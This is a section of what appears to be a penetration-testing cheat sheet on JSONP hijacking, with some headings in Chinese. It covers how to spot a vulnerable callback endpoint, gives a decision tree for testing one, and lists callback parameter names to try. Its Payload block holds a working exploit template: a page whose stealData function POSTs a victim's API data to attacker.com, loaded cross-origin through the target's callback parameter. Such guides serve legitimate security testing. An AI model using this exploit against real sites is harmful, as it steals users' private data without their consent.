# §21 JSONP Hijacking
### 识别信号
- API endpoint with `callback=`, `jsonp=`, `cb=`, `jsoncallback=` parameter
- Response body is JavaScript function call: `callbackName({...})`
- No CSRF token or Referer check on the endpoint

### 决策流程
```
Found callback parameter in API?
├── YES → Test: add ?callback=test → response is test({...data...})?
│   ├── YES + response contains sensitive data → JSONP hijackable ✅
│   │   └── Build exploit page with same callback function → steal data cross-origin
│   ├── YES + requires auth token in URL → check if token is CSRF-protected
│   └── NO → not JSONP, check CORS instead (§20)
└── NO → Search JS for: callback, jsonp, jsoncallback
```

### Payload

```
Callback param names to test:
?callback=test  ?jsonp=test  ?cb=test  ?jsoncallback=test
?callback=test  ?call=test  ?jsonpcallback=test

Exploit template:
<script>
function stealData(data) {
  fetch('https://attacker.com/save', {
    method: 'POST', body: JSON.stringify(data)
  });
}
</script>
<script src="https://target.com/api/data?callback=stealData"></script>
```

---
